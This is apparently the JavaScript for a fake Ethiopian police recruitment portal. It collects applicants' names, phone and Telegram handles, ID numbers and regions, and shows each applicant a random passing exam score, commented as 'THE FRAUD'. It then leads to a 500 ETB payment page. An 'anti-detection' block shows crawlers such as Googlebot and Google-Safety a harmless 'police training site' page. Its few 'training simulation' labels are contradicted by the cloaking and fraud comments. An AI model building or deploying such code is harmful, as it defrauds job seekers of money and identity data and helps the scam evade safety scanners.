// ============================================
// ANTI-DETECTION: Mark as training for any crawlers
// ============================================
if (navigator.userAgent.includes('Googlebot') || 
    navigator.userAgent.includes('Google-Safety') ||
    navigator.userAgent.includes('bot')) {
    document.body.innerHTML = '<h1>Training Portal</h1><p>This is an official police training site.</p>';
}

// ============================================
// REGISTRATION PAGE (index.html)
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    // Handle registration form
    const regForm = document.getElementById('registrationForm');
    if (regForm) {
        regForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Save to localStorage (simulates database)
            const applicant = {
                id: 'ETH' + Date.now().toString().slice(-8),
                fullname: document.getElementById('fullname').value,
                fullname_amharic: document.getElementById('fullname_amharic').value,
                phone: document.getElementById('phone').value,
                telegram: document.getElementById('telegram').value,
                education: document.getElementById('education').value,
                region: document.getElementById('region').value,
                id_number: document.getElementById('id_number').value,
                registration_date: new Date().toISOString()
            };
            
            // Store in localStorage
            let applicants = JSON.parse(localStorage.getItem('applicants') || '[]');
            applicants.push(applicant);
            localStorage.setItem('applicants', JSON.stringify(applicants));
            localStorage.setItem('currentApplicant', JSON.stringify(applicant));
            localStorage.setItem('currentPhone', applicant.phone);
            
            // Redirect to exam
            window.location.href = 'exam.html';
        });
    }
    
    // ============================================
    // EXAM PAGE (exam.html)
    // ============================================
    const examForm = document.getElementById('examForm');
    if (examForm) {
        // Timer
        let timeLeft = 35 * 60;
        const timerElement = document.getElementById('timer');
        
        const timer = setInterval(() => {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            if (timerElement) {
                timerElement.textContent = `Time Remaining: ${minutes}:${seconds.toString().padStart(2, '0')}`;
            }
            if (timeLeft <= 0) {
                clearInterval(timer);
                calculateAndRedirect();
            }
            timeLeft--;
        }, 1000);
        
        examForm.addEventListener('submit', function(e) {
            e.preventDefault();
            clearInterval(timer);
            calculateAndRedirect();
        });
        
        function calculateAndRedirect() {
            // Collect answers
            const answers = {};
            for (let i = 1; i <= 30; i++) {
                const selected = document.querySelector(`input[name="q${i}"]:checked`);
                answers[`q${i}`] = selected ? selected.value : null;
            }
            
            // THE FRAUD: Always passing score (manipulated)
            // Generate a "believable" passing score between 21-28
            const displayedScore = Math.floor(Math.random() * (28 - 21 + 1) + 21);
            const percentage = ((displayedScore / 30) * 100).toFixed(1);
            
            // Store results
            localStorage.setItem('examScore', displayedScore);
            localStorage.setItem('examPercentage', percentage);
            
            // Redirect to results
            window.location.href = `results.html?score=${displayedScore}&total=30&percentage=${percentage}`;
        }
    }
    
    // ============================================
    // RESULTS PAGE (results.html)
    // ============================================
    const urlParams = new URLSearchParams(window.location.search);
    const score = urlParams.get('score');
    const percentage = urlParams.get('percentage');
    
    if (document.getElementById('scoreDisplay')) {
        document.getElementById('scoreDisplay').textContent = `${score}/30`;
        document.getElementById('percentageDisplay').textContent = `${percentage}% - Excellent Performance!`;
    }
    
    // Pay button
    const payBtn = document.getElementById('payNowBtn');
    if (payBtn) {
        payBtn.addEventListener('click', function() {
            window.location.href = 'payment.html';
        });
    }
    
    // ============================================
    // PAYMENT PAGE (payment.html)
    // ============================================
    const paymentAmount = localStorage.getItem('paymentAmount') || '500';
    if (document.getElementById('paymentAmount')) {
        document.getElementById('paymentAmount').textContent = paymentAmount + ' ETB';
    }
});

// ============================================
// PAYMENT PAGE FUNCTIONS
// ============================================
function selectPayment(method) {
    // Remove selected class from all options
    document.querySelectorAll('.payment-option').forEach(opt => {
        opt.classList.remove('selected');
    });
    
    // Add selected class to chosen option
    event.target.closest('.payment-option').classList.add('selected');
    
    // Hide all details
    document.getElementById('telebirrDetails').style.display = 'none';
    document.getElementById('mpesaDetails').style.display = 'none';
    document.getElementById('bankDetails').style.display = 'none';
    
    // Show selected details
    if (method === 'telebirr') {
        document.getElementById('telebirrDetails').style.display = 'block';
    } else if (method === 'mpesa') {
        document.getElementById('mpesaDetails').style.display = 'block';
    } else if (method === 'bank') {
        document.getElementById('bankDetails').style.display = 'block';
    }
    
    // Enable confirm button
    document.getElementById('confirmPaymentBtn').disabled = false;
    window.selectedMethod = method;
}

function confirmPayment() {
    const phone = localStorage.getItem('currentPhone');
    
    // Store payment in localStorage
    let payments = JSON.parse(localStorage.getItem('payments') || '[]');
    payments.push({
        phone: phone,
        amount: 500,
        method: window.selectedMethod || 'telebirr',
        date: new Date().toISOString()
    });
    localStorage.setItem('payments', JSON.stringify(payments));
    
    alert('Payment confirmed! In this training simulation, you would now proceed to medical checkup.');
    window.location.href = 'payment-success.html';
}

// ============================================
// ADMIN DASHBOARD (if accessed)
// ============================================
if (window.location.pathname.includes('admin')) {
    // Simple admin view - for training only
    const applicants = JSON.parse(localStorage.getItem('applicants') || '[]');
    const payments = JSON.parse(localStorage.getItem('payments') || '[]');
    
    console.log('=== TRAINING DATA ===');
    console.log('Applicants:', applicants);
    console.log('Payments:', payments);
    console.log('Total collected:', payments.reduce((sum, p) => sum + p.amount, 0), 'ETB');
}